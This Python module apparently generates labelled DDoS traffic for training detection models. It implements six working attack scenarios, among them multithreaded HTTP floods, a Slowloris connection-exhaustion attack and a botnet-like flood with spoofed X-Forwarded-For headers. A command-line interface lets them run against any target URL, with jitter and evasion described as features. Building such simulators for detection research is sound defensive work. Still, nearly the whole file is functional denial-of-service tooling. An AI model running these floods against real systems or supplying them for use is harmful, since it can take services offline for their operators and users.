"""Realistic DDoS attack scenarios.

Each scenario mimics how a real attacker operates — not just a single
flood, but realistic patterns with phases, jitter, and evasion techniques.

Scenarios:
    - http_flood       : Simple volumetric flood
    - slowloris        : Low-and-slow connection exhaustion
    - ramping_flood    : Gradual increase (tests temporal models)
    - bursty_flood     : Bursts with gaps (tests burst detection)
    - distributed      : Many threads from one IP
    - mixed            : Normal traffic + attack blend (realistic)

Each scenario:
    - Runs for a specified duration
    - Emits per-phase labels
    - Records ground truth to data/labeled/
"""
from __future__ import annotations

import json
import random
import socket
import threading
import time
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Callable

import requests
from requests.adapters import HTTPAdapter

from core.logging import get_logger

log = get_logger("simulator.attack_scenarios")

LABEL_DIR = Path("data/labeled")


# ---------------------------------------------------------------------------
# Label record — one per scenario run
# ---------------------------------------------------------------------------

@dataclass
class AttackLabel:
    scenario: str
    phase: str                # "warmup", "attack", "cooldown"
    ts_start: float
    ts_end: float
    target: str
    source_ips: list[str]
    requests_sent: int
    errors: int
    threads: int
    rps_target: float
    description: str
    is_attack: bool = True


def write_label(label: AttackLabel) -> None:
    LABEL_DIR.mkdir(parents=True, exist_ok=True)
    out = LABEL_DIR / "attack_labels.jsonl"
    with out.open("a") as f:
        f.write(json.dumps(asdict(label)) + "\n")


# ---------------------------------------------------------------------------
# HTTP session helper
# ---------------------------------------------------------------------------

def make_session(pool: int = 100) -> requests.Session:
    s = requests.Session()
    adapter = HTTPAdapter(pool_connections=pool, pool_maxsize=pool, max_retries=0)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    return s


# ---------------------------------------------------------------------------
# Scenario base
# ---------------------------------------------------------------------------

class ScenarioBase:
    """Common logic for all scenarios."""

    name = "base"

    def __init__(self, target: str, timeout: float = 3.0) -> None:
        self.target = target.rstrip("/") + "/"
        self.timeout = timeout
        self._lock = threading.Lock()
        self._sent = 0
        self._errors = 0
        self._stop = threading.Event()

    def _inc(self, ok: bool) -> None:
        with self._lock:
            self._sent += 1
            if not ok:
                self._errors += 1

    def snapshot(self) -> tuple[int, int]:
        with self._lock:
            return self._sent, self._errors

    def reset(self) -> None:
        with self._lock:
            self._sent = 0
            self._errors = 0

    def stop(self) -> None:
        self._stop.set()

    def run(self, duration: int) -> AttackLabel:
        """Override in subclasses."""
        raise NotImplementedError


# ---------------------------------------------------------------------------
# Scenario 1 — HTTP flood (simple volumetric)
# ---------------------------------------------------------------------------

class HTTPFlood(ScenarioBase):
    name = "http_flood"

    def run(self, duration: int = 30, threads: int = 30,
            paths: list[str] | None = None) -> AttackLabel:
        paths = paths or ["/", "/api/data", "/health"]
        self.reset()
        self._stop.clear()
        start = time.time()

        def worker():
            session = make_session(pool=10)
            while not self._stop.is_set() and (time.time() - start) < duration:
                try:
                    r = session.get(
                        self.target + random.choice(paths).lstrip("/"),
                        timeout=self.timeout,
                    )
                    self._inc(r.status_code < 500)
                except Exception:
                    self._inc(False)

        ws = [threading.Thread(target=worker, daemon=True) for _ in range(threads)]
        for w in ws:
            w.start()
        for w in ws:
            w.join(timeout=duration + 5)

        sent, errs = self.snapshot()
        label = AttackLabel(
            scenario=self.name, phase="attack",
            ts_start=start, ts_end=time.time(),
            target=self.target,
            source_ips=["<local>"],
            requests_sent=sent, errors=errs,
            threads=threads, rps_target=0.0,
            description=f"HTTP flood: {threads} threads, {duration}s",
        )
        write_label(label)
        log.info(f"{self.name}: sent={sent} errors={errs}")
        return label


# ---------------------------------------------------------------------------
# Scenario 2 — Slowloris (low and slow)
# ---------------------------------------------------------------------------

class Slowloris(ScenarioBase):
    name = "slowloris"

    def run(self, duration: int = 60, connections: int = 100,
            keepalive: float = 5.0) -> AttackLabel:
        self.reset()
        self._stop.clear()

        host = self.target.split("//")[-1].split("/")[0]
        if ":" in host:
            hostname, port = host.split(":")
            port = int(port)
        else:
            hostname, port = host, 80

        start = time.time()
        sockets: list[socket.socket] = []

        def open_conn() -> socket.socket | None:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((hostname, port))
                s.send(b"GET / HTTP/1.1\r\n")
                s.send(b"Host: " + hostname.encode() + b"\r\n")
                s.send(b"User-Agent: slowloris/1.0\r\n")
                self._inc(True)
                return s
            except Exception:
                self._inc(False)
                return None

        for _ in range(connections):
            s = open_conn()
            if s:
                sockets.append(s)

        while not self._stop.is_set() and (time.time() - start) < duration:
            for s in list(sockets):
                try:
                    s.send(b"X-Pad: " + b"a" * 10 + b"\r\n")
                    self._inc(True)
                except Exception:
                    self._inc(False)
                    sockets.remove(s)
                    ns = open_conn()
                    if ns:
                        sockets.append(ns)
            time.sleep(keepalive)

        for s in sockets:
            try:
                s.close()
            except Exception:
                pass

        sent, errs = self.snapshot()
        label = AttackLabel(
            scenario=self.name, phase="attack",
            ts_start=start, ts_end=time.time(),
            target=self.target,
            source_ips=["<local>"],
            requests_sent=sent, errors=errs,
            threads=len(sockets), rps_target=0.0,
            description=f"Slowloris: {connections} connections, {keepalive}s interval",
        )
        write_label(label)
        log.info(f"{self.name}: sent={sent} errors={errs}")
        return label


# ---------------------------------------------------------------------------
# Scenario 3 — Ramping flood (gradual increase)
# ---------------------------------------------------------------------------

class RampingFlood(ScenarioBase):
    name = "ramping_flood"

    def run(self, duration: int = 60, start_rps: float = 5.0,
            end_rps: float = 200.0) -> AttackLabel:
        """Gradually increase request rate over time. Tests temporal models."""
        self.reset()
        self._stop.clear()
        start = time.time()

        session = make_session(pool=20)

        while not self._stop.is_set() and (time.time() - start) < duration:
            elapsed = time.time() - start
            progress = min(elapsed / duration, 1.0)
            current_rps = start_rps + (end_rps - start_rps) * progress
            interval = 1.0 / max(current_rps, 0.001)

            try:
                r = session.get(self.target, timeout=self.timeout)
                self._inc(r.status_code < 500)
            except Exception:
                self._inc(False)

            time.sleep(interval * random.uniform(0.8, 1.2))

        sent, errs = self.snapshot()
        label = AttackLabel(
            scenario=self.name, phase="attack",
            ts_start=start, ts_end=time.time(),
            target=self.target,
            source_ips=["<local>"],
            requests_sent=sent, errors=errs,
            threads=1, rps_target=(start_rps + end_rps) / 2,
            description=f"Ramping flood: {start_rps} → {end_rps} rps over {duration}s",
        )
        write_label(label)
        log.info(f"{self.name}: sent={sent} errors={errs}")
        return label


# ---------------------------------------------------------------------------
# Scenario 4 — Bursty flood (on/off pattern)
# ---------------------------------------------------------------------------

class BurstyFlood(ScenarioBase):
    name = "bursty_flood"

    def run(self, duration: int = 60, burst_duration: float = 3.0,
            gap_duration: float = 3.0, threads: int = 20) -> AttackLabel:
        """Alternates between bursts of attack and quiet periods."""
        self.reset()
        self._stop.clear()
        start = time.time()

        def burst_worker():
            session = make_session(pool=10)
            while not self._stop.is_set():
                try:
                    r = session.get(self.target, timeout=self.timeout)
                    self._inc(r.status_code < 500)
                except Exception:
                    self._inc(False)

        while not self._stop.is_set() and (time.time() - start) < duration:
            # Burst phase
            ws = [threading.Thread(target=burst_worker, daemon=True) for _ in range(threads)]
            for w in ws:
                w.start()
            time.sleep(burst_duration)

            # Gap phase
            self._stop.set()    # tell workers to stop
            for w in ws:
                w.join(timeout=1)
            self._stop.clear()

            time.sleep(gap_duration)

        sent, errs = self.snapshot()
        label = AttackLabel(
            scenario=self.name, phase="attack",
            ts_start=start, ts_end=time.time(),
            target=self.target,
            source_ips=["<local>"],
            requests_sent=sent, errors=errs,
            threads=threads, rps_target=0.0,
            description=f"Bursty: {burst_duration}s burst / {gap_duration}s gap",
        )
        write_label(label)
        log.info(f"{self.name}: sent={sent} errors={errs}")
        return label


# ---------------------------------------------------------------------------
# Scenario 5 — Distributed (many "fake IPs" via X-Forwarded-For)
# ---------------------------------------------------------------------------

class DistributedFlood(ScenarioBase):
    name = "distributed"

    def __init__(self, target: str, timeout: float = 3.0,
                 spoof_xff: bool = True) -> None:
        super().__init__(target, timeout)
        self.spoof_xff = spoof_xff

    def _rand_ip(self) -> str:
        return ".".join(str(random.randint(1, 254)) for _ in range(4))

    def run(self, duration: int = 30, threads: int = 50,
            ips_per_thread: int = 5) -> AttackLabel:
        """Simulates many "fake" source IPs to mimic a botnet."""
        self.reset()
        self._stop.clear()
        start = time.time()

        def worker(tid: int):
            session = make_session(pool=5)
            while not self._stop.is_set() and (time.time() - start) < duration:
                try:
                    headers = {"User-Agent": "curl/7.8"}
                    if self.spoof_xff:
                        headers["X-Forwarded-For"] = self._rand_ip()
                    r = session.get(self.target, headers=headers,
                                    timeout=self.timeout)
                    self._inc(r.status_code < 500)
                except Exception:
                    self._inc(False)

        ws = [threading.Thread(target=worker, args=(i,), daemon=True)
              for i in range(threads)]
        for w in ws:
            w.start()
        for w in ws:
            w.join(timeout=duration + 5)

        sent, errs = self.snapshot()
        label = AttackLabel(
            scenario=self.name, phase="attack",
            ts_start=start, ts_end=time.time(),
            target=self.target,
            source_ips=["<spoofed>"] if self.spoof_xff else ["<local>"],
            requests_sent=sent, errors=errs,
            threads=threads, rps_target=0.0,
            description=f"Distributed: {threads} threads, XFF={'on' if self.spoof_xff else 'off'}",
        )
        write_label(label)
        log.info(f"{self.name}: sent={sent} errors={errs}")
        return label


# ---------------------------------------------------------------------------
# Scenario 6 — Mixed (normal + attack blend)
# ---------------------------------------------------------------------------

class MixedTraffic(ScenarioBase):
    name = "mixed"

    def run(self, duration: int = 60, normal_rps: float = 3.0,
            attack_threads: int = 15) -> AttackLabel:
        """Runs normal traffic AND attack concurrently — realistic."""
        self.reset()
        self._stop.clear()
        start = time.time()

        # Normal traffic thread (background, low rate)
        def normal_worker():
            session = make_session()
            interval = 1.0 / normal_rps
            while not self._stop.is_set() and (time.time() - start) < duration:
                try:
                    session.get(self.target, timeout=self.timeout)
                except Exception:
                    pass
                time.sleep(interval)

        # Attack threads
        def attack_worker():
            session = make_session(pool=10)
            while not self._stop.is_set() and (time.time() - start) < duration:
                try:
                    r = session.get(self.target, timeout=self.timeout)
                    self._inc(r.status_code < 500)
                except Exception:
                    self._inc(False)

        n_thread = threading.Thread(target=normal_worker, daemon=True)
        n_thread.start()

        attack_ws = [threading.Thread(target=attack_worker, daemon=True)
                     for _ in range(attack_threads)]
        for w in attack_ws:
            w.start()

        time.sleep(duration)
        self._stop.set()
        for w in attack_ws:
            w.join(timeout=2)
        n_thread.join(timeout=2)

        sent, errs = self.snapshot()
        label = AttackLabel(
            scenario=self.name, phase="attack",
            ts_start=start, ts_end=time.time(),
            target=self.target,
            source_ips=["<local>"],
            requests_sent=sent, errors=errs,
            threads=attack_threads, rps_target=normal_rps,
            description=f"Mixed: {normal_rps} rps normal + {attack_threads} attack threads",
        )
        write_label(label)
        log.info(f"{self.name}: sent={sent} errors={errs}")
        return label


# ---------------------------------------------------------------------------
# Registry
# ---------------------------------------------------------------------------

SCENARIOS: dict[str, type[ScenarioBase]] = {
    "http_flood":      HTTPFlood,
    "slowloris":       Slowloris,
    "ramping_flood":   RampingFlood,
    "bursty_flood":    BurstyFlood,
    "distributed":     DistributedFlood,
    "mixed":           MixedTraffic,
}


if __name__ == "__main__":
    import argparse

    p = argparse.ArgumentParser(description="Realistic DDoS attack scenarios")
    p.add_argument("--scenario", required=True, choices=list(SCENARIOS.keys()))
    p.add_argument("--target", required=True)
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--threads", type=int, default=30,
                   help="threads (http_flood, distributed, bursty, mixed)")
    p.add_argument("--connections", type=int, default=100,
                   help="connections (slowloris only)")
    p.add_argument("--keepalive", type=float, default=5.0,
                   help="keepalive seconds (slowloris only)")
    p.add_argument("--spoof", action="store_true",
                   help="spoof X-Forwarded-For (distributed only)")
    args = p.parse_args()

    cls = SCENARIOS[args.scenario]
    sim = cls(args.target)

    # Pass the right kwargs based on scenario type
    if args.scenario == "slowloris":
        label = sim.run(
            duration=args.duration,
            connections=args.connections,
            keepalive=args.keepalive,
        )
    elif args.scenario == "distributed":
        sim.spoof_xff = args.spoof
        label = sim.run(duration=args.duration, threads=args.threads)
    elif args.scenario == "bursty_flood":
        label = sim.run(duration=args.duration, threads=args.threads)
    elif args.scenario == "mixed":
        label = sim.run(duration=args.duration, attack_threads=args.threads)
    elif args.scenario == "ramping_flood":
        label = sim.run(duration=args.duration)
    else:   # http_flood
        label = sim.run(duration=args.duration, threads=args.threads)

    print()
    print(f"=== {args.scenario} complete ===")
    print(f"  requests: {label.requests_sent}")
    print(f"  errors:   {label.errors}")
    print(f"  duration: {label.ts_end - label.ts_start:.1f}s")
    print(f"  label written to data/labeled/attack_labels.jsonl")